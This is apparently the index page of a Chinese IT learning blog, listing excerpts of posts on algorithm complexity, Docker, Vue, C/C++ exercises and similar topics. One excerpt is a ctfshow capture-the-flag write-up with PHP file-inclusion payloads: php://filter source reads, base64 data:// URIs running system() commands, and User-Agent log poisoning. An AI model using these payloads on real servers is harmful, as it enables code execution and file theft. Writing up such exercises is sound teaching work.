<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="IT学习者博客">
		<meta property="og:title" content="IT学习者博客" />
<meta property="og:description" content="IT学习者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://itnewbiea.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="IT学习者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d6fc8b0c0811f5686829bdad66a0a6a2/" rel="bookmark">
			算法基础——复杂度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 算法是解决问题的一系列操作的集合。著名的计算机科学家Niklaus Wirth曾提出：算法+数据结构=程序，由此可见算法在编程中的重要地位。本篇主要讨论算法性能好坏的标准之一——复杂度。 1 复杂度概述 1.1 什么是复杂度 本文所讨论的复杂度是指通过事先估算法计算出的用来衡量算法效率的值。因此并不是说代码的长度越长复杂度就越高，或者代码中的数据越多复杂度就越高。
1.2 为什么会有复杂度 关于复杂度的产生，我们通过下图的问题来引入。假设现在有一个人要从A地前往E地，那么他共有ABE、ADE、ABCE三种路径可以选择，但是我们可以看出，ABE的路程是最短的（假设图中距离与实际距离成比例），经过的地区也是最少的，相较于其它两条路径，ABE的优势非常明显。
算法是用来解决问题的操作步骤的集合，而我们解决同一个问题可能会如上例一样，有多种路径，这时我们需要一个标准来评判每条路径的好坏。这样一来，算法的复杂度就被提出了。
1.3 复杂度分类 算法的复杂度分为时间复杂度和空间复杂度两种。
时间复杂度用来衡量算法消耗时间的多少，空间复杂度用来衡量算法所需开辟新空间的多少。
2 时间复杂度 2.1 什么是时间复杂度 首先我们要明白，程序运行的绝对时间并不是衡量算法效率的标准。举个不太恰当的例子，使用“ENIAC”计算机（世界上第一台电子数字式计算机）与“天河一号”超级计算机执行相同的算法（死循环除外），它们的绝对时间必然有所不同。
从中我们得出，当我们评判一个算法的好坏时，不能附带有硬件条件的影响，而应关注算法本身。算法的执行时间的长度可以由每条语句的执行时间乘以该语句的执行次数，再加和得到。而每条语句的单次执行时间对现代计算机来说几乎可以忽略不计，那么对于一个程序的执行时间影响最大的因素就是单条语句的执行次数了。
因此，时间复杂度主要是用来渐进表示执行次数最多的单条语句的执行次数。
2.2 时间复杂度的计算 时间复杂度通常用"O"表示。对于任意输入量n（这里的输入量不一定是数字，也可能为数组或结构变量等，根据具体情况而定），算法的时间复杂度可记作"O(f(n))"，其中f(n)为n的函数，表示算法中的语句的执行次数。但是我们通常会使用渐进表示法来表示时间复杂度，即取f(n)中次数最高的项来表示（当n足够大时，最高次项对整个数值的影响最大）。
如果仅仅通过这些文字来理解时间复杂度可能较为抽象，我们通过几个简单的例子来理解一下。
int main() { int a; int i; for(i=0;i&lt;10;i++) a=i; return 0; } 我们来看这段代码，这其中代码执行的总次数（即执行的语句数量）为13，为一个常数，我们计这段代码的时间复杂度为"O(1)"。
这可能与大家的理解有些偏差，明明执行次数为13，为什么不计作"O(13)"呢？我们来观察这段代码，由于这段代码的输入量n对程序的运行次数不会产生影响，那么无论输入量n的大小为多少，这段代码的执行次数都是13。当输入量n趋向于无穷大时，执行次数13与1的区别并不大，可以忽略不计。为方便起见，将这些执行次数为常数的算法的时间复杂度计为"O(1)"。
也就是说，无论算法的语句执行次数为10,20,30还是一亿，十亿，一百亿，只要它是常数，那么当输入量n趋向于无穷大时，这些常数均可忽略不计，则时间复杂度计为"O(1)"。
int main() { int a; int n; int i; scanf("%d",&amp;n); for(i=0;i&lt;n;i++) a=i; return 0; } 我们再来看这段代码，这段代码与之前的代码相比的不同之处在于其有一个输入量n，并且输入量n会对代码的执行次数产生影响，例如，当输入2时，代码执行次数为7；输入量为10时，代码执行次数为15。可以推出，这段代码的执行次数与输入量n的关系为f(n)=n+5。
在这个关系中，当n趋向于无穷大时，5这个常量可忽略不计，因此我们将这个算法的时间复杂度计为"O(n)"。
通过对上面两段代码的分析，我们可以总结出一些规律，对比可以发现，影响时间复杂度的主要因素就是循环语句的循环次数与输入量n的关系。在第二段代码中，输入量为n时，循环语句执行n次，则时间复杂度为"O(n)"。
int main() { int i,j,n; scanf("%d",&amp;n); for(i=0;i&lt;n;i++) { for(j=0;j&lt;n;j++) { printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d6fc8b0c0811f5686829bdad66a0a6a2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff680dbde250b5a08e01e36fac1b194b/" rel="bookmark">
			基于docker构建香橙派zero系统构建环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近接触了很多板子，用的Soc都不一样，自己的开发设备中的环境已经混乱的不行。所以想到使用docker来管理这些开发环境，方便又省心~ 构建过程 下载docker镜像 docker pull ubuntu:18.04 新建并启动docker容器 docker run -it \ --privileged=true --cap-add=ALL \ --name opizero_env \ -p 40022:22 \ -v /home/luo/dataHDD1/OPI_SDK/OPIzero:/work \ -v /lib/modules:/lib/modules \ -v /dev:/dev \ ubuntu:18.04 /bin/bash 重新进入docker容器的交互模式 docker exec -it opizero_env /bin/bash 进入容器后 apt update apt install vim -y 修改软件源(阿里源)（可以不改） vim /etc/apt/sources.list deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb-src http://mirrors.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ff680dbde250b5a08e01e36fac1b194b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/de189fc043b5f62ef1e86c02bbf5ded2/" rel="bookmark">
			Ceres简介及示例（1）安装测试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、编译安装 项目地址 https://github.com/ceres-solver/ceres-solver/releases，目前分1.x和2.x两个版本，根据情况选择。目前很多老版本第三方库使用 v1.14版本，这里也使用该版本。
1.1 ubuntu 安装依赖项
# 安装cmake $ sudo apt-get install cmake # 安装google-glog + gflags $ sudo apt-get install libgoogle-glog-dev libgflags-dev # 安装BLAS &amp; LAPACK $ sudo apt-get install libatlas-base-dev # 安装Eigen3 $ sudo apt-get install libeigen3-dev # 安装SuiteSparse and CXSparse (optional) $ sudo apt-get install libsuitesparse-dev 下载源码解压编译
# 解压下载的ceres库 $ tar zxf ceres-solver-1.14.0.tar.gz # 切换到源码目录 $ cd ceres-solver-1.14.0 # 创建编译目录 $ mkdir build # 切换到编译目录 $ cd build # 生成Makefile $ cmake .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/de189fc043b5f62ef1e86c02bbf5ded2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f03a022aae9eacdca6564efb7ce1b070/" rel="bookmark">
			大一Python期末复习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
一，输出格式控制
①多行输出
②不换行输出
③精度保留和对齐
Ⅰ.format
Ⅱ.f'{}'
Ⅲ.%
二，嵌套
①嵌套循环
Ⅰ.for
Ⅱ.while
②嵌套列表，字典
三，列表与字符串
①添加元素
②切片访问与逆序,join
③count,find,index
④删除与替换
list
str
四，函数
①lambda
②复合函数
③可变长参数
④递归函数与迭代器
Ⅰ.递归
Ⅱ.yield
⑤eval
⑥assert
⑦zip,zip(*),*zip
Ⅰ、zip
Ⅱ、zip(*)
Ⅲ、*zip
五，文件读取和处理
①open
②with
③常用的处理
六，numpy
①数组的创建
②shape&amp;reshape
③zeros&amp;ones
④eye&amp;diagonal
⑤比较运算
⑥切片和索引
⑦vectorize
七，曲线绘制
八，字典
①元素的增加，删除，查找，修改
②keys&amp;values
③items&amp;for
九、is,==,copy
①is&amp;==
②copy&amp;deepcopy
结语
前言 一个寒假没碰Python,难免会生疏。本文是作者综合了学校考试，平时笔记还有Educoder作业，以及网上相关资源提取出来的知识点的呈现，既帮助了本人复习，也希望对你有所帮助。记得一键三连哦~~
一，输出格式控制 ①多行输出 六个单引号
print('''hello wolrd''') output: hello wolrd ②不换行输出 print('hello',end='---')#指定连接符，可为空 print('world',end='---') print('!') output: hello---world---!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f03a022aae9eacdca6564efb7ce1b070/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f35025a67dc0e0c89b52c07ab6af6d3/" rel="bookmark">
			Typora字数过多造成卡顿问题（已解决）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当typora字数达到上万的时候，使用微软输入法就会异常的卡顿，因为typora会实时渲染页面，使用微软的时候会将拼音输入到页面上再渲染，所以就会异常卡顿
有两种办法：
换个输入法，但是用惯了微软的，用别的输入法不是很舒服
调整NVIDIA对typora的支持
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60ad155377ae90b4abf85ef45cd5b223/" rel="bookmark">
			Linux下KVM虚拟机基本管理及常用命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://www.cnblogs.com/EasonJim/p/8367022.html
https://blog.csdn.net/jks212454/article/details/128113480
查看KVM虚拟机配置文件
#Kvm虚拟机默认配置文件位置 [root@kvm qemu]# pwd /etc/libvirt/qemu [root@kvm qemu]# ll total 12 -rw------- 1 root root 3863 Nov 6 17:26 CentOS6.5.xml -rw------- 1 root root 3771 Nov 7 00:57 CentOS6u7.xml -rw------- 1 root root 3628 Nov 7 02:04 centos.xml drwx------ 3 root root 40 Nov 7 00:46 networks 启动与关闭
#显示正在运行的虚拟机 [root@kvm ~]# virsh list Id Name State ---------------------------------------------------- #显示所有虚拟机 [root@kvm ~]# virsh list --all Id Name State ---------------------------------------------------- - centos shut off - CentOS6.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/60ad155377ae90b4abf85ef45cd5b223/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9dafa7691e2feef407668484273a25a1/" rel="bookmark">
			Vue学习笔记——使用Vue脚手架
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		3.1初始化脚手架 3.1.1.说明 Vue脚手架是Vue官方提供的标准化开发工具（开发平台）最新的版本是4.x。文档：https://cli.vuejs.org/zh/ 3.1.2.具体步骤 第一步（仅第一次执行）：全局安装@vue/cli。
npm install -g @vue/cli 第二步：切换到要创建项目的目录，然后使用命令创建项目
vue create xxxx 第三步：启动项目
npm run serve 3.1.3. 模板项目的结构 ├── node_modules
├── public
│ ├── favicon.ico: 页签图标
│ └── index.html: 主页面
├── src
│ ├── assets: 存放静态资源
│ │ └── logo.png
│ │── component: 存放组件
│ │ └── HelloWorld.vue
│ │── App.vue: 汇总所有组件
│ │── main.js: 入口文件
├── .gitignore: git 版本管制忽略的配置
├── babel.config.js: babel 的配置文件
├── package.json: 应用包配置文件
├── README.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9dafa7691e2feef407668484273a25a1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/45ee0116168dcb039a953c8bc84c20e2/" rel="bookmark">
			ctfshow 文件包含
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		web78 查看源码，发现用了include包含文件，没有任何过滤
&lt;?php if(isset($_GET['file'])){ $file = $_GET['file']; include($file); }else{ highlight_file(__FILE__); } payload：
?file=php://filter/read=convert.base64-encode/resource=flag.php web79 查看源码，发现对php进行了过滤，采用data协议，进行base64编码
&lt;?php if(isset($_GET['file'])){ $file = $_GET['file']; $file = str_replace("php", "???", $file); include($file); }else{ highlight_file(__FILE__); } payload：
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAnKTs/Pg== //编码处是 &lt;?php system("ls ");?&gt; 回显flag.php，index.php ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg== //编码处是 &lt;?php system("cat flag.php");?&gt; web80 查看源码，在上题基础上又把data过滤了
这里采用包含日志文件绕过，通过User-Agent头部注入命令：
payload：
?file=/var/log/nginx/access.log //ua头：&lt;? php system('ls');?&gt; -&gt; &lt;? php system('cat fl0g.php');?&gt; web81 跟上一个题一样，记得bp点击send时候，点击两下
web82-86 &lt;?php if(isset($_GET['file'])){ $file = $_GET['file']; $file = str_replace("php", "???", $file); $file = str_replace("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/45ee0116168dcb039a953c8bc84c20e2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d723b853e848d4c4e8c42a0bb19a5f7f/" rel="bookmark">
			OpenFeign调用微服务使用RequestInterceptor或@RequestHeader传递http请求头信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		记录：391
场景：基于Spring Cloud OpenFeign调用微服务Restful接口时，请求头从A服务传递到B服务，可以使用RequestInterceptor接口或者@RequestHeader注解传递请求头信息。
版本：JDK 1.8,SpringBoot 2.6.3,springCloud 2021.0.1
1.使用RequestInterceptor传递请求头信息
1.1关于RequestInterceptor
RequestInterceptor是一个接口，全路径：feign.RequestInterceptor。
RequestInterceptor本质上就是一个拦截器，拦截时机是在OpenFeign调用Restful接口前拦截，因此可以设置请求信息。
使用RequestInterceptor，需实现它的apply(RequestTemplate var1)。换句话说，就是在apply方法中向RequestTemplate对象中注入请求头，
1.2实现RequestInterceptor接口
(1)代码
@Slf4j @Configuration public class FeignConfiguration implements RequestInterceptor { @Override public void apply(RequestTemplate requestTemplate) { // 1.从前端过来的请求头取信息 RequestAttributes reqAttributes = RequestContextHolder.currentRequestAttributes(); HttpServletRequest request = ((ServletRequestAttributes) reqAttributes).getRequest(); String cityCode = request.getHeader("cityCode"); requestTemplate.header("cityCode", cityCode); // 2.设置自定义请求头信息 requestTemplate.header("cityNo", "0571"); } } (2)解析
feign.RequestTemplate，feign的请求模板类，包括请求相关信息。
org.springframework.web.context.request.RequestContextHolder，取请求头工具类。
org.springframework.web.context.request.RequestAttributes，包含请求属性信息，是接口，需转换为实现类：org.springframework.web.context.request.ServletRequestAttributes。再取值。
1.3在OpenFeign接口应用RequestInterceptor
在OpenFeign接口应用RequestInterceptor，也就是引入RequestInterceptor接口实现类FeignConfiguration。
(1)代码
@FeignClient(contextId = "cityFeignService", value = "hub-example-301-nacos", fallbackFactory = CityFeignServiceFallbackFactory.class, configuration = {FeignConfiguration.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d723b853e848d4c4e8c42a0bb19a5f7f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d014a88e79e04250e5786bbc846bb8a4/" rel="bookmark">
			ArcMap模型构建器【迭代多值】小技巧
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实验目的：用arcmap模型构建器（Model Builder）创建，多个矢量数据与一个淹没面矢量数据重叠部分的某字段统计值，。
工具：ArcMap10.8。【按位置选择】、【汇总统计数据】
数据：farmland.shp、house.shp、水深淹没面.shp
操作：拖选工具和数据构建模型，先选中farmland数据右击【属性】，弹出的窗口，选择常规的【值列表】，“+”添加数据。若要添加汇总统计数据工具，一键生成多个要素的汇总统计表，则需要注意：只适合汇总不同要素的相同字段的值，且汇总方式相同（如，sum）。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b63b8bde2a68ed5f845ea7057afd2d1/" rel="bookmark">
			问题总结，web自动化测试元素无法操作？shadowDOM节点元素解决......
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录：导读 前言一、Python编程入门到精通二、接口自动化项目实战三、Web自动化项目实战四、App自动化项目实战五、一线大厂简历六、测试开发DevOps体系七、常用自动化测试工具八、JMeter性能测试九、总结（尾部小惊喜） 前言 web自动化遇到shadowDOM你会操作吗？
之前在做web自动化的时候，发现页面上有些元素，在selenium中无法通过xpath来定位，各种原因找了半天都没找到解决方案，最后发现元素在一个叫做shadow-root的节点下面，如下所示：
问题：shadow-root是什么？为什么下面的节点在selenium无法通过xapth来定位？
web自动化测试：https://www.bilibili.com/video/BV1MS4y1W79K/
shadowDOM介绍
可以看成一个隐藏的DOM。它是一个独立的DOM树，具有自己的元素和样式，与原始文档DOM完全隔离。
ShadowDOM 必须附在一个HTML元素中，存放shadowDOM的元素，我们可以把它称为宿主元素。
在HTML5中有很多的标签样式都是通过shadowDOM来实现的。
比如：日期选择框，音频播放标签，视频播放标签都自带了样式；
这边以音频播放标签audio为例：在html文件中写入一个audio标签，页面上显示出来的内容就会出现一个音频播放器，如下图：
&lt;audio src="file/123.mp3" controls="controls"&gt;&lt;/audio&gt; 页面效果：
我们没有给aduio标签做任何的css样式设置，那么上面播放器样式是怎么实现的呢？
答案就是浏览器在解析audio标签的时候，会自动在audio下添加一个shadowDOM（这个播放器的样式都是在这里设置的），而audio就是这个shadowDOM的宿主标签，shadowDOM中封装好了所有内容和样式，只要定义一个宿主标签就能显示shadowDOM中的所有内容。
我们按F12打开浏览器的调试工具，点击audio标签，就能看到如下信息：
注意：需要调试工具中勾选显示浏览器设置的shadowDOM节点，看能看到如上信息（默认看不到浏览器的shadowDOM），如下：
通过上面的案例我们大致的了解了一下shadowDOM的作用，它其实就是浏览器提供的一种“封装”功能，提供了一种强大的技术去隐藏一些实现细节，前面列举的几个html5中的元素就是这样来做的。
现在有部分项目的前端页面，开发人员也使用了这一技术来进行封装，当然自己封装的shadowDOM，在使用F12调试工具打开的时候，是可以清楚的的看到内部的节点和样式和代码的。
shawomDOM中的节点操作
关于shawomDOM中的节点，selenium中并没有提供相关操作的方法，我们要操作的话就只能通过JS代码来实现，接下来给大家演示一个案例：
需求：修改 shawom-root下span标签中的元素内容为 666
实现步骤：
1、先定位到shadow-root的宿主节点(此处为id=box的div)
2、切换到shadow-root中
3、然后再选择shadow-root下的span标签
难点：selenuim中只能选择到宿主标签，无法选择到shadow-root
解决思路：JS来实现
1、js实现代码如下:
2、selenium中通过js实现代码如下：
import time from selenium import webdriver driver = webdriver.Chrome() driver.get(url="http:127.0.0.1:5000/test") js = 'document.getElementById("box").shadowRoot.children[0].children[0].innerText=666' res = driver.execute_script(js) 下面是我整理的2023年最全的软件测试工程师学习知识架构体系图 一、Python编程入门到精通 二、接口自动化项目实战 三、Web自动化项目实战 四、App自动化项目实战 五、一线大厂简历 六、测试开发DevOps体系 七、常用自动化测试工具 八、JMeter性能测试 九、总结（尾部小惊喜） 坚强的路是自己走出来的，不是想出来的；坚强的心是自己炼出来的，不是说出来的;坚强的人是自己活出来的，不是天生的；做一个坚强者，无畏任何艰难！
午后的猫在阳光下懒懒地躺着，旁边得棉被被阳光晒得暖暖的，空气中有很好闻的味道，小巷子里静悄悄的，一如你沉静的内心。
懂得如何避开问题的人，胜过知道怎样解决问题的人。在这个世界上，不知道怎么办的时候，就选择学习，也许是最佳选择。胜出者往往不是能力而是观念！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e35210ae2955a9723168ab733586a892/" rel="bookmark">
			SQLServer判断字段的长度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		select datalength(字段名) from 数据库名
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d70cc21c8c2e6aa31fcc71fcf0985eee/" rel="bookmark">
			获取当天零点/最晚时间戳
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 当天零点时间戳 new Date(new Date().toLocaleDateString()).getTime() 当天23:59:59时间戳 new Date(new Date(new Date().toLocaleDateString()).getTime()+24*60*60*1000-1).getTime() new Date(new Date().toLocaleDateString()+' 23:59:59').getTime() 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c879bbc986a599a90c82a3758b7e9c10/" rel="bookmark">
			【C&#43;&#43;】C&#43;&#43;语言初步
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基本信息 书籍：C++面向对象程序设计——清华出版社，李晋江 刘培强
书中代码环境：Visual C++2008 Windows XP
本人代码运行环境：Vs2019 Windows10
主要是复习C++，适合有基础的人看。
1 C++语言初步 书本第三章
1.1 Hello,C++ main.cpp
#include &lt;iostream&gt; using namespace std; int main() { std::cout &lt;&lt; "Hello C++" &lt;&lt; std::endl; int i; std::cin &gt;&gt; i; std::cout &lt;&lt; "i=" &lt;&lt; i &lt;&lt; std::endl; return 0; } 1.2 名字空间 iostream输入输出流
命名空间namespace：为解决C++中名字冲突而引入的。
#include &lt;iostream&gt; int main_helloC(); using namespace std; int main_helloC() { std::cout &lt;&lt; "Hello C++" &lt;&lt; std::endl; int i; std::cin &gt;&gt; i; std::cout &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c879bbc986a599a90c82a3758b7e9c10/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7e6223657a0db2e6c603f56d5115c90/" rel="bookmark">
			C语言--编写一个类似库函数strlrn()的函数，求字符串的长度。在main()函数中输入一个字符串，调用该函数后输出结果。要求函数的形参采用指针变量。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		源代码：
#include &lt;stdio.h&gt; int strlen1(char* ps){ int n=0; while(*ps!='\0'){ n++; ps++; } return n; } int main() { char str[30]; printf("请输入一串字符："); gets(str); printf("该字符串的长度为%d\n",strlen1(str)); return 0; } 运行结果：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c11532b3cc8aea3ee4aa0055e2b83363/" rel="bookmark">
			C语言--编写函数fun()，将一个数字字符转换成与之相同的整数。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		源代码：
#include &lt;stdio.h&gt; #define N 50 int fun(char* ps){ int n=0; for(;*ps!='\0';ps++) n=n*10+*ps-'0'; return n; } int main() { char str[N]; printf("请输入一个数字字符串："); gets(str); int ret=fun(str); printf("与之相同的整数为：%d\n",ret); return 0; } 运行结果：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae3b0e006e7b37d5aa68c0a7a0dae6a3/" rel="bookmark">
			如何删除数组中的某个元素（C/Python/Java/Go/MATLAB）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、C、Python、Java、Go、Matlab语言优势对比二、如何删除数组中的某个元素，在各语言中的实现1、C语言2、Python3、Java4、Go语言5、MATLAB 总结 加粗样式
前言 根据之前的文章分享《GitHub 2022 的趋势和见解》，可以看到各种开发语言在最近几年的使用人群占权比，个人也感觉Python是特别受欢迎的。 下面针对几种语言做了简单介绍，并简单写了下《如何删除数组中的某个元素》的实现逻辑和代码示例，希望对看到人有帮助。
一、C、Python、Java、Go、Matlab语言优势对比 C语言
优势：C语言是一种底层语言，直接操作计算机内存，具有高效、快速、灵活的特点，可以编写高性能的系统程序、驱动程序、嵌入式系统等。C语言还拥有丰富的库函数和工具链，可以支持跨平台编程和开发大型软件项目。
特点：C语言语法简洁，学习难度适中，易于理解和掌握，可以帮助开发者提高程序性能和效率，但由于需要手动管理内存和指针，容易出现内存泄漏和安全漏洞。
Python
优势：Python是一种高级语言，具有简洁、易读、易学的特点，支持多种编程范式，适用于快速开发、原型设计、数据分析、人工智能等领域。Python拥有丰富的库和生态系统，可以大幅度提高开发效率，支持跨平台编程。
特点：Python语言简洁、易读易写，具有自然语言风格，语法结构简单，不需要手动管理内存，支持动态类型和垃圾回收机制，但相对于C语言，Python的程序运行速度较慢。
Java
优势：Java是一种跨平台语言，具有高度的可移植性和安全性，适用于开发网络应用、企业级应用、移动应用等。Java拥有庞大的社区和生态系统，支持丰富的库和框架，可以大幅度提高开发效率。
特点：Java语言面向对象，支持封装、继承、多态等特性，具有良好的可读性、可维护性和可扩展性，但由于需要运行在Java虚拟机上，相比C语言等语言，Java程序的启动和运行速度相对较慢。
Go语言
优势：Go语言是一种开源、高效、安全、简单的语言，拥有静态类型、垃圾回收、并发机制等特性，适用于高并发、网络编程、云计算等领域。Go语言具有简洁的语法、编译快、运行快的特点，可以提高开发效率和程序性能。
特点：Go语言拥有类似于C语言的指针和内存管理机制，同时也支持自动类型和垃圾回收机制，避免了一些内存泄漏和越界访问等问题，使得Go语言编写的程序更加安全、稳定。Go语言还内置了协程和通道机制，可以方便地进行并发编程和数据通信。
Matlab
优势：Matlab是一种专业的科学计算和数据分析语言，拥有强大的数学库和可视化工具，适用于信号处理、图像处理、仿真、机器学习等领域。Matlab语言易于学习和使用，提供了丰富的函数库和工具箱，可以大幅度提高开发效率。
特点：Matlab语言具有独特的矩阵操作和向量化特性，可以简化数学计算和科学建模过程，支持多种数据类型和数据结构。Matlab还提供了可视化和交互式编程环境，方便用户进行数据可视化和结果分析。但Matlab程序的执行速度相对较慢，不适合编写高性能和实时性要求较高的程序。
总的来说，每种编程语言都有自己的优势和特点，选择何种编程语言主要取决于项目需求和开发人员的技术背景。在实际开发过程中，可以根据项目的特点和需求来选择最适合的编程语言。
二、如何删除数组中的某个元素，在各语言中的实现 1、C语言 在C语言中，要删除数组中的某个元素，需要将该元素之后的所有元素向前移动一个位置，以覆盖被删除的元素。可以通过以下代码实现：
#include &lt;stdio.h&gt; int main() { int arr[] = {1, 2, 3, 4, 5}; int n = sizeof(arr) / sizeof(arr[0]); // 数组长度 int index = 2; // 要删除的元素下标 // 将元素向前移动一个位置 for(int i = index; i &lt; n - 1; i++) { arr[i] = arr[i + 1]; } n--; // 数组长度减1 printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ae3b0e006e7b37d5aa68c0a7a0dae6a3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60d4c2f7e377f7124c25e040f3f53b73/" rel="bookmark">
			css动画实践
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		动画实践 animation 其属性有一下几种：
animation-delay 设置延时，即从元素加载完成之后到动画序列开始执行的这段时间。
animation-direction
设置动画在每次运行完后是反向运行还是重新回到开始位置重复运行。
animation-duration
设置动画一个周期的时长。
animation-iteration-count
设置动画重复次数，可以指定 infinite 无限次重复动画。一般常用. Infinite. 表示无限循环
animation-name
指定由@keyframes描述的关键帧名称。
animation-play-state
允许暂停和恢复动画。
animation-timing-function
设置动画速度，即通过建立加速度曲线，设置动画在关键帧之间是如何变化。 也就是定义动画播放的节奏。linear: 代表 均匀播放。
animation-fill-mode
指定动画执行前后如何为目标元素应用样式。
一般来说 可以直接把所有属性写在一行中：
比如:
animation: animation-name animation-duration animation-iteration-count animation: colorCh 0.2s infinite;
然后通过 @keyframes 配置关键帧 展示效果。
因为动画的时间设置是通过 CSS 样式定义的，关键帧使用 percentage 来指定动画发生的时间点。0% 表示动画的第一时刻，100% 表示动画的最终时刻。因为这两个时间点十分重要，所以还有特殊的别名：from 和 to。这两个都是可选的，若 from/0% 或 to/100% 未指定，则浏览器使用计算值开始或结束动画。
也可包含额外可选的关键帧，描述动画开始和结束之间的状态。 这个的话 可以用 from{ }. to { } 来进行关键帧的描述，当然实际上 from也就是0%。 to 是100%
有些属性值得 注意的是。
`opacity 属性指定了一个元素的不透明度。换言之，opacity 属性指定了一个元素后面的背景的被覆盖程度``
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/60d4c2f7e377f7124c25e040f3f53b73/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/558f998c4898bee9717ec4f5678abede/" rel="bookmark">
			c&#43;&#43;学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、初识c++ 1.1、常量 作用：用于记录程序中不可修改的变量。
2、核心编程 2.1 内存分区模型 c++ 程序执行时，将内存大方向划分为4个区域。
